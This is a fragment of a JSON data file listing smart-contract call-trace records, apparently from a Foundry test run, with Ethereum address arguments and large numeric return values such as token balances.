        "id": "686",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "4017689936057941373285615 [4.017e24]"
    },
    {
        "id": "534",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "1762216429781939787049 [1.762e21]"
    },
    {
        "id": "9223",
        "args": "4570936969504711308 [4.57e18]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "5752000000000000000 [5.752e18]"
    }
]